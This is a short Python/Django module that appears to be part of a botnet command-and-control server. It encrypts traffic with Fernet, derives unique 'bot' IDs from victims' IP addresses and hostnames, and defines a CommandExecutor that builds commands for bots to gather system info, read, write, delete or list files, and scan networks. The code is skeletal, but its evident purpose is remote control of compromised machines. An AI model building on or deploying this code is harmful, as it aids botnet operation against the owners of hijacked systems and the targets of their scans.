from cryptography.fernet import Fernet
from django.conf import settings

import hashlib
import base64

def encrypt_data(data):
    '''Encrypting data using fernet symmetric encryption'''
    if isinstance(data, str):
        data = data.encode('utf-8')
    return settings.FERNET.encrypt(data)

def decrypt_data(encrypted_data):
    '''Decrypt fernet encrypted data'''
    if isinstance(encrypted_data, str):
        encrypted_data = encrypted_data.encode('utf-8')
    return settings.FERNET.decrypt(encrypted_data).decode('utf-8')

def generate_bot_id(ip_address, hostname):
    '''Generating unique bot id'''
    unique_string = f"{ip_address}-{hostname}-{hashlib.sha256(hostname.encode()).hexdigest()[:8]}"
    return hashlib.md5(unique_string.encode()).hexdigest()


class CommandExecutor:
    '''Executing different types commands on bots'''

    @staticmethod
    def get_system_info():
        return {
            'command': 'system_info',
            'description': 'Get system information',
        }
    
    @staticmethod
    def execute_file_operations(operation, path):
        return {
            'command': 'file_operation',
            'operation': operation, # read, write , delete , list
            'path': path
        }
    
    @staticmethod
    def network_scan(target):
        return {
            'command': 'network_scan',
            'target': target,
        }


